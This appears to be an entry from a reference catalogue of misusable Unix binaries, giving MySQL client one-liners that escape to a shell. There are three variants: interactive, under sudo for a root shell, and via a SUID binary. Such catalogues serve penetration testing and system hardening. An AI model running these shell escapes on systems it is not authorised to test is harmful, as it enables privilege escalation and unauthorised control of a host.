---
description: A valid MySQL server must be available.
functions:
  execute-interactive:
    - code: mysql -e '\! /bin/sh'
  sudo-enabled:
    - code: sudo mysql -e '\! /bin/sh'
  suid-limited:
    - code: ./mysql -e '\! /bin/sh'
---
